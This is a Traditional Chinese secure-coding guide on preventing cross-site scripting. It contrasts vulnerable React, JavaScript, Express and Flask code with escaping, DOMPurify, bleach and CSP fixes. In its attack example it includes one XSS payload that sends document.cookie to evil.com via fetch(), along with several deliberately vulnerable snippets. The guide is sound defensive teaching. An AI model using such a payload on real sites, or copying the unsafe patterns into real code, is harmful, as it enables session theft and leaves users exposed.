---
title: 預防跨站腳本攻擊 (XSS Prevention)
impact: CRITICAL
category: security
tags: xss, security, html, javascript
---

# 預防跨站腳本攻擊 (Cross-Site Scripting, XSS)

絕對不要將未經消毒 (Unsanitized) 的使用者輸入直接插入 HTML 之中。請務必對輸出進行跳脫處理 (Escape)，或是使用預設就會自動跳脫的框架。

## 為什麼這很重要？

XSS 允許攻擊者在其他使用者瀏覽的網頁中注入惡意腳本，導致衍生風險：
- 劫持會話 Session (竊取 cookies/tokens)
- 憑證竊取 (鍵盤側錄 keylogging, 劫持表單)
- 網頁竄改
- 釣魚攻擊
- 散佈惡意軟體

## ❌ 錯誤示範

**問題:** 使用者輸入直接插入 HTML 中，沒有進行跳脫。

```javascript
// React - 危險！
function UserProfile({ user }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: user.bio }} />
  );
}

// Vanilla JS - 危險！
document.getElementById('username').innerHTML = userInput;

// 樣板字面值 (Template literal) - 危險！
const html = `<div>你好 ${username}</div>`;
```

**攻擊範例:**
```javascript
const maliciousInput = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
// 如果未經跳脫就插入，就會執行攻擊者的 JavaScript
```

## ✅ 正確示範

### React (自動跳脫)
```jsx
function UserProfile({ user }) {
  // ✅ React 預設會自動跳脫
  return <div>{user.bio}</div>;
}

// 若真的需要渲染 HTML，請先進行消毒
import DOMPurify from 'dompurify';

function UserProfile({ user }) {
  const sanitizedBio = DOMPurify.sanitize(user.bio);
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitizedBio }} />
  );
}
```

### Vanilla JavaScript 原生寫法
```javascript
// ✅ 僅需要純文字時請用 textContent
element.textContent = userInput;

// ✅ 以安全的方式建立元素
const div = document.createElement('div');
div.textContent = username;
container.appendChild(div);

// ✅ 如果必須寫入 HTML，請確保先消毒過
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userHtml);
```

### 後端 (Express + Template Engines)
```javascript
// ✅ Template engines 預設都會自動跳脫
// EJS
<div><%= username %></div>  // 已跳脫
<div><%- username %></div>  // 未跳脫 (危險！)

// Handlebars
<div>{{username}}</div>     // 已跳脫
<div>{{{username}}}</div>   // 未跳脫 (危險！)

// Pug
div= username               // 已跳脫
div!= username              // 未跳脫 (危險！)
```

### Python (Flask/Jinja2)
```python
from markupsafe import escape

# ✅ 手動跳脫
@app.route('/user/<username>')
def user_profile(username):
    return f'<h1>你好 {escape(username)}</h1>'

# ✅ Jinja2 自動跳脫
# template.html
<h1>你好 {{ username }}</h1>  {# 已跳脫 #}
<h1>你好 {{ username|safe }}</h1>  {# 未跳脫 #}
```

## XSS 的種類

### 1. 反射型 (Reflected XSS)
```javascript
// ❌ 危險: 將 URL 參數原樣反射到頁面上
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>搜尋結果: ${query}</h1>`);
});

// ✅ 安全: 跳脫輸出
app.get('/search', (req, res) => {
  const query = escape(req.query.q);
  res.send(`<h1>搜尋結果: ${query}</h1>`);
});
```

### 2. 儲存型 (Stored XSS)
```javascript
// ❌ 危險: 儲存了未被消毒的輸入
app.post('/comment', async (req, res) => {
  await db.comments.insert({ text: req.body.comment });
});

// 日後在畫面上直接顯示而未跳脫
app.get('/comments', async (req, res) => {
  const comments = await db.comments.find();
  const html = comments.map(c => `<p>${c.text}</p>`).join('');
  res.send(html);
});

// ✅ 安全: 輸入時先消毒，或是輸出時先跳脫
import DOMPurify from 'isomorphic-dompurify';

app.post('/comment', async (req, res) => {
  const sanitized = DOMPurify.sanitize(req.body.comment);
  await db.comments.insert({ text: sanitized });
});
```

### 3. DOM-based XSS
```javascript
// ❌ 危險: 使用 URL 的 fragment 進行 DOM 操作
const username = location.hash.substring(1);
document.getElementById('welcome').innerHTML = `你好 ${username}`;

// ✅ 安全: 使用 textContent
const username = location.hash.substring(1);
document.getElementById('welcome').textContent = `你好 ${username}`;
```

## Content Security Policy (CSP)

請加入 CSP headers 設定以達成縱深防禦：

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
  );
  next();
});
```

**CSP 的防禦重點:**
- 防治執行行內腳本 (Inline scripts)
- 阻止從未授權的網域載入腳本
- 封鎖 `eval()` 及其他危險的方法

## 消毒函式庫 (Sanitization Libraries)

### DOMPurify (Browser & Node.js)
```javascript
import DOMPurify from 'dompurify';

// 基本消毒
const clean = DOMPurify.sanitize(dirty);

// 自訂設定
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
```

### bleach (Python)
```python
import bleach

clean = bleach.clean(
    dirty_html,
    tags=['p', 'b', 'i', 'strong', 'em', 'a'],
    attributes={'a': ['href', 'title']},
    strip=True
)
```

## 最佳實踐與檢查表

- [ ] **利用前端框架的自動跳脫功能** (React, Vue, Angular, 等等)
- [ ] **絕不將使用者輸入放入 `innerHTML` 中**
- [ ] **消毒 HTML (Sanitize HTML)** 如果系統需要支援富文本 Rich Text (使用 DOMPurify)
- [ ] **實作 CSP headers 配置**
- [ ] **在伺服器端再驗證一次輸入** (作為縱深防禦)
- [ ] **使用 HTTPOnly cookies** (防止被 JavaScript 讀取)
- [ ] **根據文本上下文進行跳脫 (Encode output)** (針對 HTML, JS, URL, CSS 有不同處理差異)

## 參考資料 (References)

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
